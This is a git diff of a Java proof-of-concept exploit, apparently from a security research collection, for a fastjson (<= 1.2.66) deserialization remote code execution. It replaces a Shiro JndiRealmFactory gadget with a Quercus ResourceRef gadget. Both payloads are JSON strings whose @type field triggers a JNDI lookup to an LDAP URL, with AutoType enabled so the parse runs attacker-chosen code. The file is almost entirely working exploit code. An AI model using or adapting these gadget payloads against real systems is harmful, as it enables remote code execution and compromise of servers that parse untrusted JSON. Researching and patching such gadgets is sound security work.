@@ -5,19 +5,20 @@ import com.alibaba.fastjson.parser.ParserConfig;
 import com.threedr3am.bug.common.server.LdapServer;
 
 /**
- * fastjson <= 1.2.66 RCE，需要开启AutoType
+ * fastjson <= 1.2.66 RCE，需要开启AutoType & JSON.parseObject
  *
  *
- * shiro-core gadget
+ * quercus ResourceRef jndi gadget
  *
  * <dependency>
- *       <groupId>org.apache.shiro</groupId>
- *       <artifactId>shiro-core</artifactId>
+ *       <groupId>com.caucho</groupId>
+ *       <artifactId>quercus</artifactId>
+ *       <version>4.0.63</version>
  * </dependency>
  *
  * @author threedr3am
  */
-public class ShiroPoc {
+public class QuercusPoc {
   static {
     //rmi server示例
 //    RmiServer.run();
@@ -29,7 +30,7 @@ public class ShiroPoc {
   public static void main(String[] args) {
     ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
-    String payload = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:43658/Calc\"], \"Realms\":[\"\"]}";//ldap方式
-    JSON.parse(payload);
+    String payload = "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:43658/Calc\"}";//ldap方式
+    JSON.parseObject(payload);
   }
 }
